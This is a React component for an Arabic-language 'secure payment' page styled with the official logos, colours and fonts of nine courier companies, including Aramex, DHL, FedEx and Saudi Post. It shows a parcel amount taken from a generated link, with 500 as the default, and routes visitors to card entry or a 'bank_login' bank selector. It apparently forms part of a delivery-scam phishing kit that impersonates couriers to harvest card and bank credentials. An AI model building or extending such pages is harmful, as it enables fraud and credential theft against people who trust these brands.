import { useParams, useNavigate } from "react-router-dom";
import { getServiceBranding } from "@/lib/serviceLogos";
import { useLink } from "@/hooks/useSupabase";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency, getCurrencyByCountry } from "@/lib/countryCurrencies";
import { CreditCard, ArrowLeft, Hash, DollarSign, Package, Truck } from "lucide-react";

const PaymentDetailsOfficial = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data: linkData } = useLink(id);

  const serviceKey = linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  const shippingInfo = linkData?.payload as any;

  // Get country code from link data
  const countryCode = shippingInfo?.selectedCountry || "SA";

  // Get currency info for display
  const currencyInfo = getCurrencyByCountry(countryCode);

  // Get amount from link data - ensure it's a number, handle all data types
  const rawAmount = shippingInfo?.cod_amount;

  // Handle different data types and edge cases
  let amount = 500; // Default value
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  // Format amount with currency symbol and name
  const formattedAmount = formatCurrency(amount, countryCode);

  const handleProceed = () => {
    // Check payment method from link data
    const paymentMethod = shippingInfo?.payment_method || 'card';

    // If payment method is "card", skip bank selector and go directly to card input
    if (paymentMethod === 'card') {
      navigate(`/pay/${id}/card-input`);
    } else {
      // For "bank_login" method, show bank selector
      navigate(`/pay/${id}/bank-selector`);
    }
  };

  // Get company-specific styling
  const getCompanyStyles = () => {
    const styles: Record<string, any> = {
      aramex: {
        gradient: 'linear-gradient(135deg, #E31E24, #FF6B35)',
        background: 'linear-gradient(180deg, #FFF 0%, #FFF5F5 100%)',
        cardBg: '#FFFFFF',
        primaryText: '#1A1A1A',
        secondaryText: '#6B6B6B',
        logo: '/logos/aramex-logo.svg',
        fontFamily: "'DIN Next', 'Cairo', 'Tajawal', sans-serif",
        headerBg: '#FFFFFF',
        borderColor: '#E0E0E0',
        buttonShadow: '0 4px 12px rgba(227, 30, 36, 0.25)',
      },
      dhl: {
        gradient: 'linear-gradient(135deg, #FFCC00, #D40511)',
        background: 'linear-gradient(180deg, #FFF 0%, #FFF9E6 100%)',
        cardBg: '#FFFFFF',
        primaryText: '#1A1A1A',
        secondaryText: '#6B6B6B',
        logo: '/logos/dhl-logo.svg',
        fontFamily: "'Helvetica', 'Arial', sans-serif",
        headerBg: '#FFFFFF',
        borderColor: '#E0E0E0',
        buttonShadow: '0 4px 12px rgba(255, 204, 0, 0.25)',
      },
      fedex: {
        gradient: 'linear-gradient(135deg, #4D148C, #FF6600)',
        background: 'linear-gradient(180deg, #FFF 0%, #F5F0FF 100%)',
        cardBg: '#FFFFFF',
        primaryText: '#1A1A1A',
        secondaryText: '#6B6B6B',
        logo: '/logos/fedex-logo.svg',
        fontFamily: "'Inter', 'Helvetica', sans-serif",
        headerBg: '#FFFFFF',
        borderColor: '#E0E0E0',
        buttonShadow: '0 4px 12px rgba(77, 20, 140, 0.25)',
      },
      ups: {
        gradient: 'linear-gradient(135deg, #351C15, #FFB500)',
        background: 'linear-gradient(180deg, #FFF 0%, #F5F3F2 100%)',
        cardBg: '#FFFFFF',
        primaryText: '#1A1A1A',
        secondaryText: '#6B6B6B',
        logo: '/logos/ups-logo.svg',
        fontFamily: "'Arial', 'Helvetica', sans-serif",
        headerBg: '#FFFFFF',
        borderColor: '#E0E0E0',
        buttonShadow: '0 4px 12px rgba(53, 28, 21, 0.25)',
      },
      empost: {
        gradient: 'linear-gradient(135deg, #C8102E, #003087)',
        background: 'linear-gradient(180deg, #FFF 0%, #FFF0F2 100%)',
        cardBg: '#FFFFFF',
        primaryText: '#1A1A1A',
        secondaryText: '#6B6B6B',
        logo: '/logos/empost-logo.png',
        fontFamily: "'Cairo', 'Tajawal', sans-serif",
        headerBg: '#FFFFFF',
        borderColor: '#E0E0E0',
        buttonShadow: '0 4px 12px rgba(200, 16, 46, 0.25)',
      },
      smsa: {
        gradient: 'linear-gradient(135deg, #0066CC, #FF6600)',
        background: 'linear-gradient(180deg, #FFF 0%, #F0F7FF 100%)',
        cardBg: '#FFFFFF',
        primaryText: '#1A1A1A',
        secondaryText: '#6B6B6B',
        logo: '/logos/smsa-logo.svg',
        fontFamily: "'Cairo', 'Tajawal', sans-serif",
        headerBg: '#FFFFFF',
        borderColor: '#E0E0E0',
        buttonShadow: '0 4px 12px rgba(0, 102, 204, 0.25)',
      },
      zajil: {
        gradient: 'linear-gradient(135deg, #1C4587, #FF9900)',
        background: 'linear-gradient(180deg, #FFF 0%, #F0F5FF 100%)',
        cardBg: '#FFFFFF',
        primaryText: '#1A1A1A',
        secondaryText: '#6B6B6B',
        logo: '/logos/zajil-logo.svg',
        fontFamily: "'Cairo', 'Tajawal', sans-serif",
        headerBg: '#FFFFFF',
        borderColor: '#E0E0E0',
        buttonShadow: '0 4px 12px rgba(28, 69, 135, 0.25)',
      },
      naqel: {
        gradient: 'linear-gradient(135deg, #0052A3, #FF6B00)',
        background: 'linear-gradient(180deg, #FFF 0%, #F0F5FF 100%)',
        cardBg: '#FFFFFF',
        primaryText: '#1A1A1A',
        secondaryText: '#6B6B6B',
        logo: '/logos/naqel-logo.svg',
        fontFamily: "'Cairo', 'Tajawal', sans-serif",
        headerBg: '#FFFFFF',
        borderColor: '#E0E0E0',
        buttonShadow: '0 4px 12px rgba(0, 82, 163, 0.25)',
      },
      saudipost: {
        gradient: 'linear-gradient(135deg, #006C35, #FFB81C)',
        background: 'linear-gradient(180deg, #FFF 0%, #F0FFF4 100%)',
        cardBg: '#FFFFFF',
        primaryText: '#1A1A1A',
        secondaryText: '#6B6B6B',
        logo: '/logos/saudipost-logo.png',
        fontFamily: "'Cairo', 'Tajawal', sans-serif",
        headerBg: '#FFFFFF',
        borderColor: '#E0E0E0',
        buttonShadow: '0 4px 12px rgba(0, 108, 53, 0.25)',
      },
    };

    return styles[serviceKey] || styles.aramex;
  };

  const companyStyles = getCompanyStyles();

  return (
    <div
      className="min-h-screen"
      style={{
        background: companyStyles.background,
        fontFamily: companyStyles.fontFamily,
      }}
    >
      {/* Official Company Header */}
      <header
        className="sticky top-0 z-50 w-full border-b"
        style={{
          backgroundColor: companyStyles.headerBg,
          borderBottomColor: companyStyles.borderColor,
          boxShadow: '0 2px 8px rgba(0,0,0,0.05)',
        }}
      >
        <div className="container mx-auto px-4 h-16 sm:h-20 flex items-center justify-between">
          <div className="flex items-center gap-3 sm:gap-4">
            <img
              src={companyStyles.logo}
              alt={serviceName}
              className="h-8 sm:h-12 w-auto object-contain"
            />
          </div>
          <div className="text-right">
            <h1 className="text-lg sm:text-xl font-bold" style={{ color: companyStyles.primaryText }}>
              {serviceName}
            </h1>
            <p className="text-xs sm:text-sm" style={{ color: companyStyles.secondaryText }}>
              خدمة الدفع الآمن
            </p>
          </div>
        </div>
        {/* Brand Bar */}
        <div
          className="h-1 w-full"
          style={{
            background: companyStyles.gradient,
          }}
        />
      </header>

      {/* Main Content */}
      <main className="container mx-auto px-4 py-6 sm:py-8">
        <div className="max-w-2xl mx-auto">
          {/* Progress Indicator */}
          <div
            className="mb-6 sm:mb-8 p-4 sm:p-6 rounded-lg border"
            style={{
              backgroundColor: companyStyles.cardBg,
              borderColor: companyStyles.borderColor,
            }}
          >
            <div className="flex items-center justify-between mb-3">
              <span
                className="text-sm font-semibold"
                style={{ color: companyStyles.primaryText }}
              >
                الخطوة 1 من 4
              </span>
              <span
                className="text-xs"
                style={{ color: companyStyles.secondaryText }}
              >
                {serviceName}
              </span>
            </div>
            <div className="w-full h-2 bg-gray-200 rounded-full overflow-hidden">
              <div
                className="h-full rounded-full transition-all duration-500"
                style={{
                  width: '25%',
                  background: companyStyles.gradient,
                }}
              />
            </div>
          </div>

          {/* Content Card */}
          <div
            className="border rounded-xl p-6 sm:p-8 mb-6"
            style={{
              backgroundColor: companyStyles.cardBg,
              borderColor: companyStyles.borderColor,
              boxShadow: '0 4px 12px rgba(0,0,0,0.08)',
            }}
          >
            {/* Shipping Info Display */}
            {shippingInfo && (
              <div className="mb-6 sm:mb-8">
                <h3
                  className="font-bold mb-4 text-base sm:text-lg"
                  style={{ color: companyStyles.primaryText }}
                >
                  تفاصيل الشحنة
                </h3>
                <div className="space-y-3">
                  {shippingInfo.tracking_number && (
                    <div className="flex items-center gap-3 p-3 rounded-lg" style={{ backgroundColor: `${branding.colors.primary}08` }}>
                      <Hash className="w-5 h-5" style={{ color: branding.colors.primary }} />
                      <div className="flex-1">
                        <div className="text-xs" style={{ color: companyStyles.secondaryText }}>
                          رقم الشحنة:
                        </div>
                        <div className="font-bold text-sm" style={{ color: companyStyles.primaryText }}>
                          {shippingInfo.tracking_number}
                        </div>
                      </div>
                    </div>
                  )}
                  {shippingInfo.package_description && (
                    <div className="flex items-center gap-3 p-3 rounded-lg" style={{ backgroundColor: `${branding.colors.primary}08` }}>
                      <Package className="w-5 h-5" style={{ color: branding.colors.primary }} />
                      <div className="flex-1">
                        <div className="text-xs" style={{ color: companyStyles.secondaryText }}>
                          وصف الطرد:
                        </div>
                        <div className="font-bold text-sm" style={{ color: companyStyles.primaryText }}>
                          {shippingInfo.package_description}
                        </div>
                      </div>
                    </div>
                  )}
                  {shippingInfo.cod_amount > 0 && (
                    <div className="flex items-center gap-3 p-3 rounded-lg" style={{ backgroundColor: `${branding.colors.primary}08` }}>
                      <DollarSign className="w-5 h-5" style={{ color: branding.colors.primary }} />
                      <div className="flex-1">
                        <div className="text-xs" style={{ color: companyStyles.secondaryText }}>
                          مبلغ COD:
                        </div>
                        <div className="font-bold text-sm" style={{ color: companyStyles.primaryText }}>
                          {formatCurrency(shippingInfo.cod_amount, countryCode)}
                        </div>
                      </div>
                    </div>
                  )}
                </div>
              </div>
            )}

            {/* Payment Summary */}
            <div className="border-t pt-6" style={{ borderColor: companyStyles.borderColor }}>
              <h3
                className="font-bold mb-4 text-base sm:text-lg"
                style={{ color: companyStyles.primaryText }}
              >
                ملخص الدفعة
              </h3>

              <div className="space-y-4">
                <div className="flex justify-between py-3 border-b" style={{ borderColor: companyStyles.borderColor }}>
                  <span
                    className="text-sm sm:text-base"
                    style={{ color: companyStyles.secondaryText }}
                  >
                    الخدمة
                  </span>
                  <span
                    className="font-semibold text-sm sm:text-base"
                    style={{ color: companyStyles.primaryText }}
                  >
                    {serviceName}
                  </span>
                </div>

                <div
                  className="flex justify-between items-center p-4 sm:p-5 rounded-lg border-2"
                  style={{
                    background: `linear-gradient(135deg, ${branding.colors.primary}08, ${branding.colors.secondary}08)`,
                    borderColor: branding.colors.primary,
                  }}
                >
                  <span
                    className="text-base sm:text-lg font-bold"
                    style={{ color: companyStyles.primaryText }}
                  >
                    المبلغ الإجمالي
                  </span>
                  <span
                    className="text-xl sm:text-2xl font-bold"
                    style={{ color: branding.colors.primary }}
                  >
                    {formattedAmount}
                  </span>
                </div>
              </div>
            </div>

            {/* Payment Method */}
            <div className="mt-6 sm:mt-8">
              <h3
                className="font-bold mb-4 text-base sm:text-lg"
                style={{ color: companyStyles.primaryText }}
              >
                طريقة الدفع
              </h3>
              <div
                className="border-2 rounded-lg p-4"
                style={{
                  borderColor: branding.colors.primary,
                  backgroundColor: `${branding.colors.primary}10`,
                }}
              >
                <div className="flex items-center gap-3">
                  <CreditCard className="w-6 h-6" style={{ color: branding.colors.primary }} />
                  <div>
                    <p
                      className="font-bold text-sm sm:text-base"
                      style={{ color: companyStyles.primaryText }}
                    >
                      الدفع بالبطاقة
                    </p>
                    <p className="text-xs sm:text-sm" style={{ color: companyStyles.secondaryText }}>
                      Visa، Mastercard، Mada
                    </p>
                  </div>
                </div>
              </div>
            </div>
          </div>

          {/* Proceed Button */}
          <button
            onClick={handleProceed}
            className="w-full text-white font-bold py-4 sm:py-5 px-6 rounded-lg transition-all duration-300 hover:shadow-lg active:scale-[0.98] flex items-center justify-center gap-2 text-sm sm:text-base"
            style={{
              background: companyStyles.gradient,
              boxShadow: companyStyles.buttonShadow,
              fontFamily: companyStyles.fontFamily,
            }}
          >
            <span>المتابعة للدفع</span>
            <ArrowLeft className="w-5 h-5" />
          </button>

          <p
            className="text-xs text-center mt-4"
            style={{ color: companyStyles.secondaryText }}
          >
            بالمتابعة، أنت توافق على الشروط والأحكام
          </p>
        </div>
      </main>
    </div>
  );
};

export default PaymentDetailsOfficial;
